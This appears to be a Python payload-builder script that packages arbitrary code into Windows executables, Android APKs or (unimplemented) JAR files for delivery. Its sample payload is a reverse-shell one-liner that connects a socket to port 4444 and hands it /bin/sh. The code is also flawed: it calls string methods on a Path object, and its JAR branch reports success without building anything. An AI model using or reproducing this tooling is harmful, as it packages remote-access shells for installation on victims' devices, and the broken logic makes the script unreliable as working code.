import os
import sys
import subprocess
from pathlib import Path

# Ensure that the required directories exist
def ensure_directory_exists(directory):
    Path(directory).mkdir(parents=True, exist_ok=True)

# Convert Python script to .exe (using PyInstaller)
def convert_to_exe(payload_code, output_file):
    try:
        temp_file = "temp_payload.py"
        with open(temp_file, "w", encoding="utf-8") as file:
            file.write(payload_code)
        
        # Using PyInstaller to convert the Python code to .exe
        command = f"pyinstaller --onefile --distpath {output_file.parent} --workpath .build {temp_file}"
        subprocess.run(command, check=True, shell=True)

        exe_file = output_file.with_suffix(".exe")
        if Path(exe_file).exists():
            print(f"[+] EXE Payload generated: {exe_file}")
        else:
            print(f"[!] Error: EXE payload generation failed!")
    except Exception as e:
        print(f"[!] Error in converting to EXE: {e}")
    finally:
        if Path(temp_file).exists():
            os.remove(temp_file)

# Convert Python script to .apk (using Pydroid or Kivy)
def convert_to_apk(payload_code, output_file):
    try:
        temp_file = "temp_payload.py"
        with open(temp_file, "w", encoding="utf-8") as file:
            file.write(payload_code)
        
        # Assuming Kivy and Buildozer are set up
        buildozer_command = f"buildozer android debug deploy run"
        subprocess.run(buildozer_command, check=True, shell=True)

        apk_file = output_file.with_suffix(".apk")
        if Path(apk_file).exists():
            print(f"[+] APK Payload generated: {apk_file}")
        else:
            print(f"[!] Error: APK payload generation failed!")
    except Exception as e:
        print(f"[!] Error in converting to APK: {e}")
    finally:
        if Path(temp_file).exists():
            os.remove(temp_file)

# Convert Python script to .jar (using Jython or similar tool)
def convert_to_jar(payload_code, output_file):
    try:
        temp_file = "temp_payload.py"
        with open(temp_file, "w", encoding="utf-8") as file:
            file.write(payload_code)
        
        # Using Jython or other methods to convert Python to .jar
        # Here we assume we use some external tool to convert it
        print("[!] Jar conversion is not yet implemented. Implement external tool if needed.")
        # command = f"some_external_tool {temp_file} {output_file}"
        # subprocess.run(command, check=True, shell=True)

        jar_file = output_file.with_suffix(".jar")
        print(f"[+] JAR Payload generated: {jar_file}")
    except Exception as e:
        print(f"[!] Error in converting to JAR: {e}")
    finally:
        if Path(temp_file).exists():
            os.remove(temp_file)

# Main conversion handler
def convert_to_format(payload_code, output_file):
    if output_file.endswith(".exe"):
        convert_to_exe(payload_code, output_file)
    elif output_file.endswith(".apk"):
        convert_to_apk(payload_code, output_file)
    elif output_file.endswith(".jar"):
        convert_to_jar(payload_code, output_file)
    else:
        print(f"[!] Unsupported format: {output_file.suffix}")

if __name__ == "__main__":
    # Sample usage
    sample_payload = '''import socket,subprocess; s=socket.socket(); s.connect(("127.0.0.1", 4444)); subprocess.run(["/bin/sh"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())'''
    output_dir = Path("./generated_payloads")
    ensure_directory_exists(output_dir)
    convert_to_format(sample_payload, output_dir / "payload_sample")